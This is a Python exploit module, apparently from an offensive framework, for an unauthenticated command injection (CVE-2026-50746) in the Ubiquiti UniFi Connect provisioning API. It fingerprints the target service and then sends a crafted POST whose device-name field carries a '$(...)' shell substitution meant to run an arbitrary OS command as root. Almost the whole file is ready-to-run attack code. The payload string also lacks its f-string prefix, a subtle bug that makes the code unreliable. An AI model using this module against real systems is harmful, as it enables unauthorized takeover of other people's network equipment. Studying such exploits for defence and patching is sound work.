# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""CVE-2026-50746: Ubiquiti UniFi Connect Command Injection.

The Ubiquiti UniFi Connect application exposes a management API endpoint
that fails to sanitize user-supplied input in the device provisioning
workflow. An unauthenticated attacker can inject arbitrary OS commands,
achieving remote code execution with the privileges of the UniFi Connect
service process (typically root).

CVSS v3.1: 10.0 (Critical)
Vector:    AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
"""
import json
import socket
import ssl

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

__all__ = ["Exploit"]


class Exploit(BaseExploit):
    """Ubiquiti UniFi Connect unauthenticated command injection
    via management API (CVE-2026-50746)."""

    __info__ = {
        "name": "CVE-2026-50746: Ubiquiti UniFi Connect Command Injection",
        "description": (
            "The UniFi Connect management API does not sanitize the "
            "device name field during provisioning. An unauthenticated "
            "attacker injects OS commands through a crafted POST request, "
            "gaining remote code execution as root."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-50746",
            "https://community.ui.com/releases",
        ),
        "devices": (
            "Ubiquiti UniFi Connect (all versions prior to patch)",
        ),
        "cve": "CVE-2026-50746",
        "cvss": "10.0",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1059", "T1190"],
        "mitre_tactics": ["Initial Access", "Execution"],
    }

    target = OptIP("", "Target IPv4 address of the UniFi Connect host")
    port = OptPort(443, "HTTPS port for the UniFi Connect API")
    timeout = OptFloat(8.0, "Connection timeout in seconds")
    command = OptString("id", "OS command to inject (PoC; default: id)")
    verify_ssl = OptBool(False, "Verify TLS certificate (default: False)")

    _API_PROVISION = "/api/connect/provision"
    _API_STATUS = "/api/connect/status"

    @mute
    def check(self) -> bool:
        """Probe the UniFi Connect status endpoint for service fingerprint."""
        if HAS_REQUESTS:
            try:
                url = f"https://{self.target}:{self.port}{self._API_STATUS}"
                resp = requests.get(
                    url, timeout=self.timeout, verify=self.verify_ssl
                )
                if resp.status_code == 200:
                    data = resp.json()
                    return "connect" in data.get("service", "").lower()
                return "unifi" in resp.text.lower()
            except Exception:
                pass
        # Fallback: TLS banner check
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection(
                (self.target, self.port), timeout=self.timeout
            ) as raw:
                with ctx.wrap_socket(raw, server_hostname=self.target) as tls:
                    tls.sendall(
                        f"GET {self._API_STATUS} HTTP/1.0\r\n"
                        f"Host: {self.target}\r\n\r\n".encode()
                    )
                    banner = tls.recv(4096).decode(errors="replace").lower()
                    return "unifi" in banner or "connect" in banner
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Target IP is required")
            return

        if self.check():
            print_success(
                f"UniFi Connect service detected at {self.target}:{self.port}"
            )
        else:
            print_warning("Service not positively identified; proceeding anyway")

        self._exploit()

    def _exploit(self) -> None:
        # The injection rides in the device name field of the provisioning JSON
        payload_name = "test$({self.command})"
        body = json.dumps({
            "deviceName": payload_name,
            "macAddress": "AA:BB:CC:DD:EE:FF",
            "model": "UC-Display",
        })

        url = f"https://{self.target}:{self.port}{self._API_PROVISION}"
        headers = {"Content-Type": "application/json"}

        print_status(f"Sending command injection payload to {url}")
        print_info(f"Injected command: {self.command}")

        if HAS_REQUESTS:
            try:
                resp = requests.post(
                    url,
                    data=body,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )
                print_info(f"HTTP {resp.status_code}")
                if resp.status_code in (200, 201):
                    print_success(
                        "Provisioning request accepted. If the target is "
                        "vulnerable, the injected command has been executed."
                    )
                    if resp.text.strip():
                        print_info(f"Response body: {resp.text[:512]}")
                else:
                    print_warning(f"Unexpected status: {resp.status_code}")
            except Exception as exc:
                print_error(f"Request failed: {exc}")
        else:
            print_warning("requests library not installed; showing payload")
            print_info(f"POST {url}")
            print_info(f"Body: {body}")
